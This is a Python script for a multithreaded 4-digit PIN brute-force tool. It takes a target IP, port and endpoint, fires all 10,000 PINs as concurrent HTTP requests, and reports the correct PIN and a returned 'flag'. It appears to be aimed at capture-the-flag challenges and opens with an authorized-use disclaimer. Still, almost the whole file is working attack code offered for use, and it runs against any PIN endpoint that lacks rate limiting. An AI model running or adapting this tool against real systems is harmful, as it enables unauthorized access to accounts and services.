#!/usr/bin/env python3
"""
================================================================================
                                 TERMS OF USE & DISCLAIMER
================================================================================
This PIN Brute Forcing Script is developed strictly for educational purposes,
authorized security research, and authorized penetration testing.

By running this software, you agree to the following terms:
1. You will ONLY use this script against systems you own or have explicit,
   written permission to test.
2. You will NOT use this script for unauthorized hacking or malicious activity.
3. The author accepts no liability for misuse or damage caused by this program.

IF YOU DO NOT AGREE, DISCONTINUE USE IMMEDIATELY.
================================================================================
"""

import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


# ----------------------------------------------------------------------------
# Terminal styling helpers (plain ANSI escape codes — no external deps)
# ----------------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"


BANNER = f"""{C.CYAN}{C.BOLD}
 ██████╗ ██╗███╗   ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗
 ██╔══██╗██║████╗  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║██╔██╗ ██║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
 ██╔══██╗██║██║╚██╗██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
 ██║  ██║██║██║ ╚████║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{C.RESET}{C.DIM}                4-Digit PIN Brute-Force Utility — for authorized testing only{C.RESET}
"""


def banner():
    print(BANNER)


def info(msg):
    print(f"{C.BLUE}[*]{C.RESET} {msg}")


def success(msg):
    print(f"{C.GREEN}{C.BOLD}[+]{C.RESET} {msg}")


def error(msg):
    print(f"{C.RED}{C.BOLD}[-]{C.RESET} {msg}")


def warn(msg):
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")


# ----------------------------------------------------------------------------
# Disclaimer / consent gate
# ----------------------------------------------------------------------------
def check_disclaimer():
    print(f"{C.YELLOW}{__doc__}{C.RESET}")
    try:
        choice = input(f"{C.BOLD}Do you agree to these terms? (y/N): {C.RESET}").strip().lower()
        if choice != "y":
            error("Access Denied. You must agree to the terms to use this tool.")
            sys.exit(1)
        success("Terms accepted. Proceeding...\n")
    except (KeyboardInterrupt, EOFError):
        print()
        error("Exiting.")
        sys.exit(1)


# ----------------------------------------------------------------------------
# Interactive target configuration
# ----------------------------------------------------------------------------
def prompt_target():
    print(f"{C.MAGENTA}{C.BOLD}── Target Configuration ─────────────────────────{C.RESET}")

    while True:
        ip = input(f"{C.CYAN}  Target IP address  : {C.RESET}").strip()
        if ip:
            break
        warn("IP address cannot be empty.")

    while True:
        port_raw = input(f"{C.CYAN}  Target port        : {C.RESET}").strip()
        if port_raw.isdigit() and 0 < int(port_raw) <= 65535:
            port = int(port_raw)
            break
        warn("Please enter a valid port number (1-65535).")

    endpoint = input(f"{C.CYAN}  PIN endpoint path  [/pin]: {C.RESET}").strip() or "/pin"
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint

    workers_raw = input(f"{C.CYAN}  Concurrent workers [50]: {C.RESET}").strip()
    workers = int(workers_raw) if workers_raw.isdigit() and int(workers_raw) > 0 else 50

    print(f"{C.MAGENTA}{C.BOLD}──────────────────────────────────────────────────{C.RESET}\n")
    return ip, port, endpoint, workers


# ----------------------------------------------------------------------------
# Brute-force engine
# ----------------------------------------------------------------------------
found_event = threading.Event()
attempts_done = threading.Lock()
counter = {"n": 0}
result = {}


def try_pin(session, ip, port, endpoint, pin):
    if found_event.is_set():
        return None

    formatted_pin = f"{pin:04d}"
    try:
        response = session.get(
            f"http://{ip}:{port}{endpoint}?pin={formatted_pin}",
            timeout=5,
        )
    except requests.RequestException:
        return None
    finally:
        with attempts_done:
            counter["n"] += 1

    if response.ok:
        try:
            data = response.json()
        except ValueError:
            return None
        if "flag" in data:
            found_event.set()
            result["pin"] = formatted_pin
            result["flag"] = data["flag"]
            return formatted_pin
    return None


def progress_printer(total):
    """Runs in a background thread, prints a live counter until the search ends."""
    spinner = "|/-\\"
    i = 0
    while not found_event.is_set() and counter["n"] < total:
        pct = (counter["n"] / total) * 100
        sys.stdout.write(
            f"\r{C.YELLOW}[{spinner[i % 4]}]{C.RESET} Attempts: "
            f"{C.BOLD}{counter['n']:>5}{C.RESET}/{total}  "
            f"({pct:5.1f}%)  "
        )
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)


def brute_force(ip, port, endpoint, max_workers):
    total = 10000
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=max_workers, pool_maxsize=max_workers)
    session.mount("http://", adapter)

    info(f"Targeting {C.BOLD}http://{ip}:{port}{endpoint}{C.RESET}")
    info(f"Brute-forcing all 10,000 possible PINs with {max_workers} workers...\n")

    printer_thread = threading.Thread(target=progress_printer, args=(total,), daemon=True)
    printer_thread.start()

    start = time.time()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(try_pin, session, ip, port, endpoint, pin): pin
            for pin in range(total)
        }
        for future in as_completed(futures):
            if found_event.is_set():
                break
    elapsed = time.time() - start

    found_event.set()  # ensure the progress thread exits
    printer_thread.join(timeout=1)
    print()  # newline after progress line

    if "pin" in result:
        print()
        success(f"Correct PIN found: {C.BOLD}{C.GREEN}{result['pin']}{C.RESET}")
        success(f"Flag: {C.BOLD}{C.GREEN}{result['flag']}{C.RESET}")
    else:
        print()
        error("No correct PIN found in range 0000-9999.")

    info(f"Completed in {elapsed:.2f} seconds ({counter['n']} requests sent).")


# ----------------------------------------------------------------------------
# Entry point
# ----------------------------------------------------------------------------
def main():
    banner()
    check_disclaimer()
    ip, port, endpoint, workers = prompt_target()
    try:
        brute_force(ip, port, endpoint, workers)
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user. Exiting.")
        sys.exit(1)


if __name__ == "__main__":
    main()
